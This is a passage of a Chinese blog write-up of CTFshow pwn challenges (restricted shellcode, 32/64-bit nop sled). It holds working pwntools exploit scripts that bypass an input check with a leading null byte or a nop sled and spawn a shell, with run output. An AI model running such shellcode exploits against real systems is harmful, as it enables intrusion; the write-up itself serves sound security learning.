class="number">0x1000u</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your shellcode is :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)check(buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; ERROR !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">void</span> *))buf)(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>buf存在溢出点，往buf里写入shellcode，然后程序会执行shellcod</p><p>但是有一个check函数，跟进查看：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">(_BYTE *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *i; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( *buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = &amp;unk_400F20; *i &amp;&amp; *i != *buf; ++i ) </span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !*i )  <span class="comment">//  *i == 0，即字符集遍历结束（遇到 &#x27;\0&#x27;）</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数会对我们输入的shellcode进行检查，我们输入的shellcode的每一位字符要在unk_400F20中，检查的时候*i&#x3D;&#x3D;0会退出，<code>可以使用\x00来绕过</code>。</p><p>继续跟进unk_400F20：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:0000000000400F20 unk_400F20      db  5Ah ; Z             ; DATA XREF: check+8↑o</span><br><span class="line">.rodata:0000000000400F21                 db  5Ah ; Z</span><br><span class="line">.rodata:0000000000400F22                 db  4Ah ; J</span><br><span class="line">.rodata:0000000000400F23                 db  20h</span><br><span class="line">.rodata:0000000000400F24                 db  6Ch ; l</span><br><span class="line">.rodata:0000000000400F25                 db  6Fh ; o</span><br><span class="line">.rodata:0000000000400F26                 db  76h ; v</span><br><span class="line">.rodata:0000000000400F27                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F28                 db  73h ; s</span><br><span class="line">.rodata:0000000000400F29                 db  20h</span><br><span class="line">.rodata:0000000000400F2A                 db  73h ; s</span><br><span class="line">.rodata:0000000000400F2B                 db  68h ; h</span><br><span class="line">.rodata:0000000000400F2C                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F2D                 db  6Ch ; l</span><br><span class="line">.rodata:0000000000400F2E                 db  6Ch ; l</span><br><span class="line">.rodata:0000000000400F2F                 db  5Fh ; _</span><br><span class="line">.rodata:0000000000400F30                 db  63h ; c</span><br><span class="line">.rodata:0000000000400F31                 db  6Fh ; o</span><br><span class="line">.rodata:0000000000400F32                 db  64h ; d</span><br><span class="line">.rodata:0000000000400F33                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F34                 db  2Ch ; ,</span><br><span class="line">.rodata:0000000000400F35                 db  61h ; a</span><br><span class="line">.rodata:0000000000400F36                 db  6Eh ; n</span><br><span class="line">.rodata:0000000000400F37                 db  64h ; d</span><br><span class="line">.rodata:0000000000400F38                 db  20h</span><br><span class="line">.rodata:0000000000400F39                 db  68h ; h</span><br><span class="line">.rodata:0000000000400F3A                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F3B                 db  72h ; r</span><br><span class="line">.rodata:0000000000400F3C                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F3D                 db  20h</span><br><span class="line">.rodata:0000000000400F3E                 db  69h ; i</span><br><span class="line">.rodata:0000000000400F3F                 db  73h ; s</span><br><span class="line">.rodata:0000000000400F40                 db  20h</span><br><span class="line">.rodata:0000000000400F41                 db  61h ; a</span><br><span class="line">.rodata:0000000000400F42                 db  20h</span><br><span class="line">.rodata:0000000000400F43                 db  67h ; g</span><br><span class="line">.rodata:0000000000400F44                 db  69h ; i</span><br><span class="line">.rodata:0000000000400F45                 db  66h ; f</span><br><span class="line">.rodata:0000000000400F46                 db  74h ; t</span><br><span class="line">.rodata:0000000000400F47                 db  3Ah ; :</span><br><span class="line">.rodata:0000000000400F48                 db  0Fh</span><br><span class="line">.rodata:0000000000400F49                 db    5</span><br><span class="line">.rodata:0000000000400F4A                 db  20h</span><br><span class="line">.rodata:0000000000400F4B                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F4C                 db  6Eh ; n</span><br><span class="line">.rodata:0000000000400F4D                 db  6Ah ; j</span><br><span class="line">.rodata:0000000000400F4E                 db  6Fh ; o</span><br><span class="line">.rodata:0000000000400F4F                 db  79h ; y</span><br><span class="line">.rodata:0000000000400F50                 db  20h</span><br><span class="line">.rodata:0000000000400F51                 db  69h ; i</span><br><span class="line">.rodata:0000000000400F52                 db  74h ; t</span><br><span class="line">.rodata:0000000000400F53                 db  21h ; !</span><br><span class="line">.rodata:0000000000400F54                 db  0Ah</span><br><span class="line">.rodata:0000000000400F55                 db    0</span><br></pre></td></tr></table></figure><p>‘ZZJ loves shell_code,and here is a gift:’,0Fh,5,’ enjoy it!’,0Ah,0</p><p>那么只需要通过\x00绕过检查， 同时执行我们输入的shellcode就好，\x00B后面加上一个字符，对应一个汇编语句。所以可以通过\x00B\x22、\x00B\x00 、\x00J\x00、\x00RZ、\x00\x42\x22、\x00\x4a\x00等等来绕过那个检查</p><p>这个题一种解法是利用可见字符写shellcode 另一种就是绕过它 while(*a),也就是一般写代码的路，遇到\x00就不校验了，所以如果shellcode以\x00开头， 那是不是就解决了？ 先找一下汇编指以‘\x00’开头的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#提供 p8()（将整数转换为单字节）和 disasm()（反汇编机器码）函数</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> * <span class="comment">#提供 product() 函数，用于生成所有可能的字节组合</span></span><br><span class="line"><span class="keyword">import</span> re <span class="comment">#用于正则表达式匹配，过滤包含内存引用的指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[p8(k) for k in range(256)] 生成 0x00 到 0xFF 的所有单字节。</span></span><br><span class="line"><span class="comment">#product(..., repeat=i) 生成这些字节的所有排列组合（如 (0x00), (0x01), ..., (0xFF, 0xFF)）</span></span><br><span class="line"><span class="comment">#每个测试序列以 \x00 开头，后接 1~2 个任意字节</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> product([p8(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], repeat=i):</span><br><span class="line">        payload=<span class="string">b&quot;\x00&quot;</span> +<span class="string">b&quot;&quot;</span>.join(j)</span><br><span class="line">        res=disasm(payload) <span class="comment">#将机器码转换为汇编指令</span></span><br><span class="line">        <span class="keyword">if</span>(</span><br><span class="line">        res != <span class="string">&quot;\t\t...&quot;</span> <span class="comment">#排除无法反汇编的空指令</span></span><br><span class="line">        <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\[\w*?\]&quot;</span>,res) <span class="comment">#排除包含内存引用的指令</span></span><br><span class="line">            <span class="keyword">and</span> <span class="string">&quot;.byte&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res <span class="comment">#排除非标准指令</span></span><br><span class="line">        ):</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="comment">#input()</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">        ...</span><br><span class="line">   0:   00 c0                   add    al, al</span><br><span class="line">   0:   00 c1                   add    cl, al</span><br><span class="line">   0:   00 c2                   add    dl, al</span><br><span class="line">   0:   00 c3                   add    bl, al</span><br><span class="line">   0:   00 c4                   add    ah, al</span><br><span class="line">   0:   00 c5                   add    ch, al</span><br><span class="line">   0:   00 c6                   add    dh, al</span><br><span class="line">   0:   00 c7                   add    bh, al</span><br><span class="line">   0:   00 c8                   add    al, cl</span><br><span class="line">   0:   00 c9                   add    cl, cl</span><br><span class="line">   0:   00 ca                   add    dl, cl</span><br><span class="line">   0:   00 cb                   add    bl, cl</span><br><span class="line">   0:   00 cc                   add    ah, cl</span><br><span class="line">   0:   00 <span class="built_in">cd</span>                   add    ch, cl</span><br><span class="line">   0:   00 ce                   add    dh, cl</span><br><span class="line">   0:   00 cf                   add    bh, cl</span><br><span class="line">   0:   00 d0                   add    al, dl</span><br><span class="line">   0:   00 d1                   add    cl, dl</span><br><span class="line">   0:   00 d2                   add    dl, dl</span><br><span class="line">   0:   00 d3                   add    bl, dl</span><br><span class="line">   0:   00 d4                   add    ah, dl</span><br><span class="line">   0:   00 d5                   add    ch, dl</span><br><span class="line">   0:   00 d6                   add    dh, dl</span><br><span class="line">   0:   00 d7                   add    bh, dl</span><br><span class="line">   0:   00 d8                   add    al, bl</span><br><span class="line">   0:   00 d9                   add    cl, bl</span><br><span class="line">   0:   00 da                   add    dl, bl</span><br><span class="line">   0:   00 db                   add    bl, bl</span><br><span class="line">   0:   00 dc                   add    ah, bl</span><br><span class="line">   0:   00 <span class="built_in">dd</span>                   add    ch, bl</span><br><span class="line">   0:   00 de                   add    dh, bl</span><br><span class="line">   0:   00 <span class="built_in">df</span>                   add    bh, bl</span><br><span class="line">   0:   00 e0                   add    al, ah</span><br><span class="line">   0:   00 e1                   add    cl, ah</span><br><span class="line">   0:   00 e2                   add    dl, ah</span><br><span class="line">   0:   00 e3                   add    bl, ah</span><br><span class="line">   0:   00 e4                   add    ah, ah</span><br><span class="line">   0:   00 e5                   add    ch, ah</span><br><span class="line">   0:   00 e6                   add    dh, ah</span><br><span class="line">   0:   00 e7                   add    bh, ah</span><br><span class="line">   0:   00 e8                   add    al, ch</span><br><span class="line">   0:   00 e9                   add    cl, ch</span><br><span class="line">   0:   00 ea                   add    dl, ch</span><br><span class="line">   0:   00 eb                   add    bl, ch</span><br><span class="line">   0:   00 ec                   add    ah, ch</span><br><span class="line">   0:   00 ed                   add    ch, ch</span><br><span class="line">   0:   00 ee                   add    dh, ch</span><br><span class="line">   0:   00 ef                   add    bh, ch</span><br><span class="line">   0:   00 f0                   add    al, dh</span><br><span class="line">   0:   00 f1                   add    cl, dh</span><br><span class="line">   0:   00 f2                   add    dl, dh</span><br><span class="line">   0:   00 f3                   add    bl, dh</span><br><span class="line">   0:   00 f4                   add    ah, dh</span><br><span class="line">   0:   00 f5                   add    ch, dh</span><br><span class="line">   0:   00 f6                   add    dh, dh</span><br><span class="line">   0:   00 f7                   add    bh, dh</span><br><span class="line">   0:   00 f8                   add    al, bh</span><br><span class="line">   0:   00 f9                   add    cl, bh</span><br><span class="line">   0:   00 fa                   add    dl, bh</span><br><span class="line">   0:   00 fb                   add    bl, bh</span><br><span class="line">   0:   00 <span class="built_in">fc</span>                   add    ah, bh</span><br><span class="line">   0:   00 fd                   add    ch, bh</span><br><span class="line">   0:   00 fe                   add    dh, bh</span><br><span class="line">   0:   00 ff                   add    bh, bh</span><br><span class="line"><span class="comment">#省略，太多了</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28128)</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x00\xc0&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 22221</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Restricted shellcode !</span><br><span class="line">    * *************************************</span><br><span class="line">Your shellcode is :</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn67（好难，艰难版）"><a href="#pwn67（好难，艰难版）" class="headerlink" title="pwn67（好难，艰难版）"></a>pwn67（好难，艰难版）</h2><p>Hint：32bit nop sled</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位关闭NX PIE 有可读可写可执行的段</p><p>因此我们可以从堆栈中执行。向程序提供 shellcode 很容易，因为它只要求输入。现在我们只需要找到一种方法来跳转到我们的 shellcode。</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> position; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [esp+0h] [ebp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">1027</span>]; <span class="comment">// [esp+4h] [ebp-100Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  seed[<span class="number">1025</span>] = (<span class="type">unsigned</span> <span class="type">int</span>)&amp;argc;</span><br><span class="line">  seed[<span class="number">1024</span>] = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)seed);</span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  position = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, position);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);<span class="comment">//缓冲区的长度为 0x1000 字节（4096）</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>)</span><br><span class="line">  <span class="comment">//用户可输入任意内存地址，程序会直接调用该地址处的代码</span></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  v5();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>query_position() 可以知道缓冲区在堆栈上的大致位置，</p><p>跟进query_position()：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+3h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  v2 = rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">  v3 = &amp;v1 + v2; <span class="comment">// 计算 &amp;v1 偏移 v2 字节后的地址</span></span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + v2; <span class="comment">// 返回这个随机栈地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v2 &#x3D; rand() % 1337 - 668; ：这行代码使用 rand 函数生成一个随机数，并通过取模运算将其限制在范围 0 到 1336 之间。然后，从结果中减去 668，得到一个范围在-668 到 668 之间的随机整数，并将其存储在变量 v2 中。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">低地址（栈底方向） </span><br><span class="line">+-------------------------+ &lt;-- ebp-0x1010 (buffer 起始)</span><br><span class="line">| buffer[0x1000]          |  大缓冲区，占 0x1000 字节</span><br><span class="line">| ...                     |</span><br><span class="line">| buffer[0]               |</span><br><span class="line">+-------------------------+ &lt;-- ebp-0x10 (padding 起始)</span><br><span class="line">| padding [0x10]          | 填充区，占0x10 字节（对齐用）【就是个栈桢对齐规则，不懂】</span><br><span class="line">+-------------------------+ &lt;-- ebp+0x4 (返回地址)</span><br><span class="line">| 返回地址（4字节）          |  call 指令自动压栈，函数返回时用</span><br><span class="line">+-------------------------+ &lt;-- ebp (旧 ebp)</span><br><span class="line">| 旧 ebp（4字节）           |  保存上一层栈帧的 ebp，函数返回时恢复</span><br><span class="line">+-------------------------+ &lt;-- ebp-0x15 (局部变量区)</span><br><span class="line">| stk [ebp-0x15]          |  局部变量区，占 0x15 字节（21字节）</span><br><span class="line">| ...                     |</span><br><span class="line">高地址（栈顶方向）</span><br></pre></td></tr></table></figure><p> 21 (0x15) + 4 + 4 + 16 (0x10) &#x3D; 45 字节 （0x2d）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#main函数从开始到执行到*query_position()函数的汇编代码</span><br><span class="line">.text:0804894F                 push    ebp; 保存调用者的ebp</span><br><span class="line">.text:08048950                 mov     ebp, esp; 设置新的ebp为当前esp</span><br><span class="line">.text:08048952                 push    ebx</span><br><span class="line">.text:08048953                 push    ecx</span><br><span class="line">.text:08048954                 sub     esp, 1010h; 为局部变量分配0x1010字节空间</span><br><span class="line">#此时栈顶ESP = EBP - 4 (ebx) - 4 (ecx) - 0x1010</span><br><span class="line">...</span><br><span class="line">.text:08048978                 sub     esp, 8; 为函数参数准备空间</span><br><span class="line">.text:0804897B                 push    0     ; 第一个参数buf</span><br><span class="line">.text:0804897D                 push    eax   ; 第二个参数stream</span><br><span class="line">.text:0804897E                 call    _setbuf</span><br><span class="line">.text:08048983                 add     esp, 10h ; 恢复栈指针</span><br><span class="line">#这里的add esp, 10h操作是为了恢复栈指针。实际上，函数调用前 ESP 减少了 0x10 (8 字节 sub + 8 字节 push)，但函数返回后 ESP 增加了 0x10，这是因为 C 调用约定中，调用者负责清理栈参数.</span><br><span class="line">#此时esp=ebp-0x4-0x4-0x1010-0x8-0x4-0x4+0x10=ebp-0x4-0x4-0x1010</span><br><span class="line">...</span><br><span class="line">.text:08048991                 sub     esp, 0Ch ; 为函数参数准备空间</span><br><span class="line">.text:08048994                 push    eax      ; 第一个参数seed</span><br><span class="line">.text:08048995                 call    _srand</span><br><span class="line">.text:0804899A                 add     esp, 10h ; 恢复栈指针</span><br><span class="line">#此时的栈顶为ebp-0x4-0x4-0x1010-0xc-0x4+0x10=ebp-0x4-0x4-0x1010</span><br><span class="line">.text:0804899D                 call    Loading</span><br><span class="line">.text:080489A2                 call    acquire_satellites</span><br><span class="line">.text:080489A7                 call    query_position</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+-------------------------+</span><br><span class="line">│      main 函数栈帧        │</span><br><span class="line">+-------------------------+  &lt;-- main 的 EBP（新 EBP）    </span><br><span class="line">|  保存的旧 EBP             |  4B (EBP)  </span><br><span class="line">+-------------------------+                                                      </span><br><span class="line">|    保存的 EBX            |  4B (EBP-4)                                       </span><br><span class="line">+-------------------------+                                                   </span><br><span class="line">|   保存的 ECX             |  4B (EBP-8)                                         </span><br><span class="line">+-------------------------+                                                     </span><br><span class="line">|    未使用空间             |    </span><br><span class="line">|    ...                  |  0x1010 - 0x100C = 4B                             </span><br><span class="line">+-------------------------+                                                      </span><br><span class="line">│   seed 变量              |  4B (EBP-0x100C) &lt;-- main 局部变量                </span><br><span class="line">+-------------------------+                                                     </span><br><span class="line">|    v5 变量               |  4B (ebp-0x1010) &lt;-- main 局部变量  </span><br><span class="line">+-------------------------+</span><br><span class="line">|  未使用空间（0x10 相关）    |  #其实是add esp, 0x10 </span><br><span class="line">|    ...                  |  </span><br><span class="line">+-------------------------+  &lt;-- ebp-0x1010-0x4-0x4</span><br><span class="line">|调用query_position的返回地址|  4B (EBP-0x15 - 4 = EBP-0x19)         </span><br><span class="line">+-------------------------+                </span><br><span class="line">│   query_position 函数栈帧 |                                                   </span><br><span class="line">+-------------------------+  &lt;-- query_position 的 EBP                          </span><br><span class="line">|   保存的 main 的 EBP      |  4B (EBP) </span><br><span class="line">+-------------------------+                                                 </span><br><span class="line">|  query_position 局部变量  |                                                   </span><br><span class="line">|  ...                    |  0x15 - 4 = 0x11B                          </span><br><span class="line">+-------------------------+                                                     </span><br><span class="line">|   v1 变量                |  4B (EBP-0x15) &lt;-- query_position 局部变量     </span><br><span class="line">+-------------------------+  &lt;-- ESP（栈顶）</span><br><span class="line">低地址</span><br><span class="line">所以，可以看出来v1 到 seed 的偏移 = 0x15（v1 在 query_position 的偏移） </span><br><span class="line">                   + 0x4（query_position 保存的 main ebp） </span><br><span class="line">                   + 0x4（query_position 的返回地址） </span><br><span class="line">                   + 0x10（main 栈帧内的对齐/残留空间） </span><br><span class="line">                 = 0x2D</span><br></pre></td></tr></table></figure><h6 id="nop-sled-空操作雪橇"><a href="#nop-sled-空操作雪橇" class="headerlink" title="nop sled 空操作雪橇:"></a>nop sled 空操作雪橇:</h6><p>nop sled 是一种可以破解栈随机化的缓冲区溢出攻击方式。</p><p>攻击者通过输入字符串注入攻击代码。在实际的攻击代码前注入很长的 nop 指令 （操作，仅使程序计数器加一）序列，</p><p>只要程序的控制流指向该序列任意一处，程序计数器逐步加一，直到到达攻击代码的存在的地址，并执行。</p><p>由于栈地址在一定范围的随机性，攻击者不能够知道攻击代码注入的地址，而要执行攻击代码需要将函数的返回地址更改为攻击代码的地址（可通过缓冲区溢出的方式改写函数返回地址）。所以，只能在一定范围内（栈随机导致攻击代码地址一定范围内随机）枚举攻击代码位置（有依据的猜）。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">不用 nop sled ， 函数返回地址 -------&gt; 攻击代码。</span><br><span class="line">使用 nop sled ， 函数返回地址 -------&gt; nop 序列（顺序执行） 直到攻击代码地址。</span><br></pre></td></tr></table></figure><p>为了安全地“绕过”不知道缓冲区的确切开始位置,我们可以：</p><ol><li>将 shellcode 填充为以 1336 nop 条指令开头 ( 0x90 )</li><li>使用的返回值 query_position ，添加 0x2d （如前所述），<strong>然后添加</strong> <strong>668</strong>。</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">1336</span> + shellcode</span><br><span class="line">io.recvuntil(<span class="string">b&quot;The current location: 0x&quot;</span>)</span><br><span class="line">addr = u64(unhex(io.recvline(keepends=<span class="literal">False</span>).zfill(<span class="number">16</span>)), endian=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="comment">#读取一行数据（keepends=False 去掉换行符），然后用 zfill(16) 补零到 16 个字符,unhex(...)：把十六进制字符串转成字节序列；u64(..., endian=&#x27;big&#x27;)：将字节序列按大端序转成 64 位整数[十六进制字符串已经是大端序了]</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Addr: &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">sh = addr + <span class="number">668</span> + <span class="number">0x2d</span>;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Sending: &quot;</span> + <span class="built_in">hex</span>(sh))</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(sh).encode())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 155</span><br><span class="line">Addr: 0xff9924d2</span><br><span class="line">Sending: 0xff99279b</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><p>还看了这个师傅的<a href="https://blog.csdn.net/akdelt/article/details/135954144?spm=1001.2014.3001.5502">CTFshow-pwn入门-栈溢出 (慢慢更_ctfshow pwn50-CSDN博客</a></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">unsigned int seed[1027]; // [esp+4h] [ebp-100Ch] BYREF</span><br><span class="line">char v1; // [esp+3h] [ebp-15h] BYREF //</span><br><span class="line"></span><br><span class="line">gdb ./pwn</span><br><span class="line">pwndbg&gt; b *0x080489A7#断在query_position()的call指令处</span><br><span class="line">pwndbg&gt; info registers ebp</span><br><span class="line">ebp            0xffa51578          0xffa51578</span><br><span class="line">pwndbg&gt; si# 执行push ebp，旧ebp被压入栈，esp减少4</span><br><span class="line"># 此时EIP会指向0x80487d2（mov ebp, esp），ebp仍为0xffa51578</span><br><span class="line">pwndbg&gt; si</span><br><span class="line"># 执行mov ebp, esp，更新ebp为当前esp的值（新ebp）</span><br><span class="line"># 此时EIP指向0x80487d4（下一条指令）</span><br><span class="line">   0x80487d1 &lt;query_position&gt;       push   ebp</span><br><span class="line"> ► 0x80487d2 &lt;query_position+1&gt;     mov    ebp, esp  </span><br><span class="line"> </span><br><span class="line">EBP =&gt; 0xffa50558 —▸ 0xffa51578 ◂— 0</span><br><span class="line">两个 ebp 相差 0x1020, 1020 = 4 + 4 + padding + 0x100C,padding = 0xC</span><br><span class="line">所以 v1 到 seed 偏移量 = 0x15 + 4 + 4 + padding = 41</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./pwn&#x27;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(b&quot;The current location: &quot;)</span><br><span class="line">v5_addr = eval(io.recvuntil(b&quot;\n&quot;,drop=True))#eval() 把这个十六进制字符串转换成整数</span><br><span class="line">padding = 12</span><br><span class="line">v1_seed = 0x15+4+4+padding #0x29也可以（不知道怎么看的）</span><br><span class="line">print(hex(v5_addr))</span><br><span class="line"></span><br><span class="line">payload = flat([b&quot;\x90&quot;*1336,shellcode])//相加</span><br><span class="line">sh_addr = hex(v5_addr+668+v1_seed)encode()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;What will you do?\n&gt; &quot;, payload) </span><br><span class="line">io.sendlineafter(b&quot;Where do you start?\n&gt; &quot;, sh_addr)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn68"><a href="#pwn68" class="headerlink" title="pwn68"></a>pwn68</h2><p>Hint：64bit nop sled</p><p>分析结果同上，仅仅是32位与64位的区别。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">char seed[4104]; // [rsp+10h] [rbp-1010h] BYREF</span><br><span class="line">char v1; // [rsp+Bh] [rbp-15h] BYREF</span><br><span class="line">ebp:0x7ffe53d64860-&gt;0x7ffe53d63830 </span><br><span class="line">两个 ebp 相差 0x1030, 0x1030 = 8 + 8 + padding + 0x1010,padding = 0x10</span><br><span class="line">所以 v1 到 seed 偏移量 = 0x15 + 8 + 8 + padding = 0x35</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span 